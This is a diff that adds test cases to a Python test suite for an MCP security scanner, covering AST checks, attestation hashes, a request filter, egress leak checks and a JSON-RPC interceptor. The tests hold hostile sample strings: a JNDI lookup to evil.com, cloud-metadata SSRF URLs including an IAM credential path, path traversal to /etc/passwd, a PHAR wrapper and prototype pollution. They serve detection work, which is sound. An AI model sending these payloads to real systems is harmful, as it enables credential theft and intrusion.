@@ -245,6 +245,90 @@ test("Scorecard is valid markdown", "# Trishula MCP Shield" in scorecard and "Se
 test("Scorecard contains table headers", "| Metric | Count | Standard |" in scorecard)
 test("Scorecard has attestation block", "Cryptographic Attestation Receipt" in scorecard)
 
+# ═══ CATEGORY 10: SQAV5A PILLAR 1 — PYTHON AST STATIC VERIFICATION ═══
+section("CATEGORY 10: SQAV5A PILLAR 1 — PYTHON AST STATIC VERIFICATION")
+s.reset()
+ast_findings = s.scan_python_ast(
+    "import os, subprocess, pickle\n"
+    "os.system('whoami')\n"
+    "subprocess.Popen('ls', shell=True)\n"
+    "eval('2+2')\n"
+    "pickle.loads(b'123')\n",
+    "malicious_mcp.py"
+)
+test("AST detects dynamic code exec (eval)", any(f.rule_id == "AST_DYNAMIC_CODE_EXEC" for f in ast_findings))
+test("AST detects os.system call", any(f.rule_id == "AST_OS_COMMAND_EXEC" for f in ast_findings))
+test("AST detects subprocess shell=True", any(f.rule_id == "AST_SUBPROCESS_SHELL_TRUE" for f in ast_findings))
+test("AST detects pickle.loads sink", any(f.rule_id == "AST_UNSAFE_DESERIALIZE" for f in ast_findings))
+
+s.reset()
+clean_ast = s.scan_python_ast("def add(a: int, b: int) -> int:\n    return a + b\n", "math_tool.py")
+test("AST passes clean deterministic Python", len(clean_ast) == 0 and s._ast_files_verified == 1)
+
+# ═══ CATEGORY 11: SQAV5A PILLAR 2 — SHA3-512 MERKLE ROOT & HMAC SEAL ═══
+section("CATEGORY 11: SQAV5A PILLAR 2 — SHA3-512 MERKLE ROOT & HMAC SEAL")
+s.reset()
+s.scan_content('transport = "stdio"')
+att = s.generate_attestation()
+test("Attestation includes SHA3-512 Merkle Root (128 hex chars)", len(att.get("sha3_512_merkle_root", "")) == 128)
+test("Attestation includes HMAC-SHA3-512 Seal (128 hex chars)", len(att.get("hmac_sha3_512_seal", "")) == 128)
+test("Attestation SQA standard is SQA_v5.2_ASCENDED", att.get("sqa_standard") == "SQA_v5.2_ASCENDED")
+
+# ═══ CATEGORY 12: SQAV5A PILLAR 3 & 4 — ZERO-RCE WAF & ZERO-LEAK EGRESS ═══
+section("CATEGORY 12: SQAV5A PILLAR 3 & 4 — ZERO-RCE WAF & ZERO-LEAK EGRESS")
+s.reset()
+waf_findings = s.scan_rce_and_exploit_vectors(
+    "phar://exploit.phar "
+    "__proto__.polluted = 1 "
+    "x402://drain_wallet "
+    "${jndi:ldap://evil.com/a} "
+    "http://169.254.169.254/latest/meta-data "
+    "../../etc/passwd"
+)
+test("WAF blocks PHP2Shell (CVE-2026-109618)", any(f.rule_id == "PHP2SHELL_WRAPPER_RCE" for f in waf_findings))
+test("WAF blocks Node2Shell (CVE-2026-111497)", any(f.rule_id == "NODE2SHELL_PROTO_POLLUTION" for f in waf_findings))
+test("WAF blocks x402 Wallet Drain", any(f.rule_id == "X402_WALLET_DRAIN" for f in waf_findings))
+test("WAF blocks JNDI lookup injection", any(f.rule_id == "JNDI_LOOKUP_INJECTION" for f in waf_findings))
+test("WAF blocks Cloud Metadata SSRF", any(f.rule_id == "CLOUD_METADATA_SSRF" for f in waf_findings))
+test("WAF blocks Path Traversal escape", any(f.rule_id == "PATH_TRAVERSAL_ESCAPE" for f in waf_findings))
+
+s.reset()
+egress_findings = s.scan_egress_boundary('{"path": "D:/Trishula-Infra/Doctrine/pulse_law.md", "token": "Sk9xQ2mZpL8vR4wN7tY3bK6jF1hG5dC0sA9e"}')
+test("Zero-Leak blocks protected doctrinal path (pulse_law.md)", any(f.rule_id == "ZERO_LEAK_PROTECTED_PATH" for f in egress_findings))
+test("Zero-Leak detects high-entropy secret token across boundary", any(f.rule_id == "ZERO_LEAK_HIGH_ENTROPY_SECRET" for f in egress_findings))
+
+# ═══ CATEGORY 13: RUNTIME JSON-RPC INTERCEPTOR & SARIF 2.1.0 ═══
+section("CATEGORY 13: RUNTIME JSON-RPC INTERCEPTOR & SARIF 2.1.0")
+s.reset()
+malicious_rpc = {
+    "jsonrpc": "2.0",
+    "id": 99,
+    "method": "tools/call",
+    "params": {
+        "name": "fetch_url",
+        "arguments": {"url": "http://169.254.169.254/latest/meta-data/iam"}
+    }
+}
+verdict = s.intercept_jsonrpc_message(malicious_rpc)
+test("Runtime interceptor blocks SSRF tool call", verdict["allowed"] is False)
+test("Runtime interceptor emits -32600 CRITICAL_HALT response", verdict["jsonrpc_error_response"]["error"]["code"] == -32600)
+
+s.reset()
+clean_rpc = {
+    "jsonrpc": "2.0",
+    "id": 100,
+    "method": "tools/call",
+    "params": {
+        "name": "get_weather",
+        "arguments": {"city": "Chicago"}
+    }
+}
+clean_verdict = s.intercept_jsonrpc_message(clean_rpc)
+test("Runtime interceptor allows clean JSON-RPC frame", clean_verdict["allowed"] is True)
+
+sarif = s.generate_sarif_report()
+test("SARIF report conforms to v2.1.0 schema", sarif.get("version") == "2.1.0" and len(sarif.get("runs", [])) == 1)
+
 # ═══ VERDICT ═══
 print(f"\n{'='*60}")
 total = PASSED + FAILED
